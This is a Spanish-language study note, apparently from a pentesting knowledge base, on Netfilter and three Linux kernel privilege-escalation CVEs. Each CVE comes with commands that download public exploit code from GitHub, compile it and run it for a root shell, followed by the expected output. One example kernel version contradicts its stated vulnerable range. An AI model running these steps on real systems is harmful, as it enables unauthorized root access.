---
tags:
  - privilege-escalation
  - kernel
  - netfilter
  - linux
  - exploits
aliases:
  - Netfilter Exploits
---

# 🧱 Netfilter y Vulnerabilidades en el Kernel de Linux

## ¿Qué es Netfilter?
Netfilter es un módulo del kernel de Linux que permite:

- Filtrado de paquetes.
- Traducción de direcciones de red (NAT).
- Seguimiento de conexiones.

Actúa como una capa de software en el kernel que manipula paquetes usando reglas definidas. Herramientas como `iptables` y `arptables` son interfaces que interactúan con Netfilter.

---

## 🔧 Funciones principales

1. Defragmentación de paquetes.
2. Seguimiento de conexiones.
3. Traducción de direcciones de red (NAT).

---

## ⚠️ Vulnerabilidades en Netfilter

Estas vulnerabilidades permiten **escalar privilegios a root** mediante exploits.

---

### 🔓 CVE-2021-22555
- **Kernel vulnerable:** 2.6 a 5.11.
- **Tipo:** Escritura fuera de límites (Out-Of-Bounds Write).
- **Impacto:** Escalada a root.

#### 🧪 PoC

```bash
uname -r
# Ejemplo de salida: 5.10.5-051005-generic

wget https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c
gcc -m32 -static exploit.c -o exploit
./exploit
```

#### ✅ Resultado esperado

```bash
[+] You've Got ROOT :-)
# id
uid=0(root) gid=0(root) groups=0(root)
```

---

### 🔓 CVE-2022-25636
- **Kernel vulnerable:** 5.4 a 5.6.10.
- **Archivo afectado:** `nf_dup_netdev.c`
- **Tipo:** Heap Out-Of-Bounds Write.
- **Impacto:** Escalada a root (riesgo de corrupción del kernel).

#### 🧪 PoC

```bash
uname -r
# Ejemplo de salida: 5.13.0-051300-generic

git clone https://github.com/Bonfee/CVE-2022-25636.git
cd CVE-2022-25636
make
./exploit
```

#### ✅ Resultado esperado

```bash
[*] You've Got ROOT :-)
# id
uid=0(root) gid=0(root) groups=0(root)
```

---

### 🔓 CVE-2023-32233
- **Kernel vulnerable:** Hasta 6.3.1.
- **Tipo:** Use-After-Free en `nf_tables` (sets anónimos).
- **Impacto:** Modificación de memoria del kernel, escalada a root.

#### 🧪 PoC

```bash
git clone https://github.com/Liuk3r/CVE-2023-32233
cd CVE-2023-32233
gcc -Wall -o exploit exploit.c -lmnl -lnftnl
./exploit
```

#### ✅ Resultado esperado

```bash
[*] You've Got ROOT :-)
# id
uid=0(root) gid=0(root) groups=0(root)
```

---

## 🏢 Riesgos en entornos empresariales

- Muchas empresas usan distros antiguas por compatibilidad con sus aplicaciones.
- Esto impide actualizaciones críticas del kernel.
- Incluso con contenedores o máquinas virtuales, el **kernel base sigue siendo vulnerable**.

---

## ⚠️ Advertencia

> Estos exploits pueden ser **inestables** y dañar el sistema. Algunos requieren reinicio tras ejecutarlos.
